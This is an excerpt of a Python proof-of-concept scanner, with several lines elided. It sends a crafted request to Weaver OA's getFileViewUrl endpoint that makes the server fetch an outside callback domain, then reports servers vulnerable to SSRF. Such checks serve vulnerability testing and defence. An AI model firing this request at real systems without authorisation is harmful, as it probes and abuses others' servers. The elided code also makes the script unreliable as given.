...
def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/api/doc/mobile/fileview/getFileViewUrl")
    try:
        headers = {
        ...
        data = '{"file_id": "1","file_name": "2","download_url":"http://123.%s"}'%(domain)
        requests.post(target, verify=False, headers=headers, data=data, timeout=30)
        for i in range(0, 3):
            ...
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}:Weaver_getFileViewUrl_SSRF!\033[0m")
                return True
